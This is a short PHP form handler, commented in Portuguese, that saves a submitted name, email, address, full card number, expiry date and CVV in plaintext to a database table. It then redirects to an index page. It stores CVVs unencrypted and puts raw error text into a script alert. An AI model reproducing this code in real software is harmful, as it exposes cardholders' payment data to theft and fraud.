<?php
// bancodedados.php

// Ativa a exibição de erros (desativar em produção)
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);

require 'conexao.php'; // Importa a conexão

// Se a requisição for para registrar dados
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Obtendo os dados do formulário e sanitizando
    $nome = trim($_POST['nome']);
    $email = trim($_POST['email']);
    $endereco = trim($_POST['endereco']);
    $cartao = trim($_POST['cartao']);
    $validade = trim($_POST['validade']);
    $cvv = trim($_POST['cvv']);

    // Validação simples dos dados
    if (empty($nome) || empty($email) || empty($endereco) || empty($cartao) || empty($validade) || empty($cvv)) {
        echo "<script>alert('Por favor, preencha todos os campos.');</script>";
    } else {
        // Preparando a consulta SQL
        $sql = "INSERT INTO tblhistorico (nome, email, endereco, cartao, validade, cvv) VALUES (?, ?, ?, ?, ?, ?)";
        $stmt = mysqli_prepare($conn, $sql);

        if (!$stmt) {
            die("Erro na preparação da consulta: " . mysqli_error($conn));
        }

        mysqli_stmt_bind_param($stmt, 'ssssss', $nome, $email, $endereco, $cartao, $validade, $cvv);
        $executar = mysqli_stmt_execute($stmt);

        if ($executar) {
            header("Location: ../pages/index.php");
            exit();
        } else {
            echo "<script>alert('Erro ao cadastrar: " . mysqli_stmt_error($stmt) . "');</script>";
        }

        mysqli_stmt_close($stmt);
    }
}
?>
